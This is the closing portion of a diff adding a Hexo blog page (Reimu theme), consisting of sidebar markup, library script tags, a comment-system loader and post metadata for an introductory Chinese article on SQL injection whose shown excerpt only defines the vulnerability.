+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">19</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "SQL注入基础",
+          url: "https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/",
+          excerpt: "",
+          description: "",
+          stripContent: "SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入",
+          date: "Mon Dec 29 2025 15:00:34 GMT+0800",
+          updated: "Wed Jan 21 2026 16:56:34 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
